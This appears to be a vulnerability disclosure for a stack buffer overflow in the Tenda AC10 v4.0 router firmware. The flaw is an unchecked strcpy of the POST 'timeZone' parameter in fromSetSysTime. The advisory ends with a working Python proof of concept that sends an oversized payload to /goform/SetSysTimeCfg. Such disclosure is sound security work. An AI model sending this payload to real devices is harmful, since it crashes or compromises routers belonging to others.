## Overview

- Manufacturer's website information：https://www.tenda.com.cn/

- Firmware download website: https://www.tenda.com.cn/download/detail-3506.html、https://www.tenda.com.cn/download/detail-3684.html

## Affected version

AC10 v4.0 V16.03.10.13、V16.03.10.20

## Vulnerability details

The Tenda AC10 v4.0 V16.03.10.13 firmware has a stack overflow vulnerability in the `fromSetSysTime` function. The `v5` variable receives the `timeType` parameter from a POST request and we let `v5=="sync"` to execute function `sub_4A75C0`. 

![image-20240316230222799](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316230222799.png)

The `s` variable receives the `timeZone` parameter from a POST request. However, since the user can control the input of `timeZone`, the statement `strcpy((char *)v6, s);` can cause a buffer overflow. The user-provided  `timeZone` can exceed the capacity of the `v6` array, triggering this security vulnerability.

![image-20240316230530806](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316230530806.png)

![image-20240316230359899](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316230359899.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSysTimeCfg"
payload = b"a"*2000

data = {
        'timeType':'sync',
        'timeZone':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240316230737905](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316230737905.png)
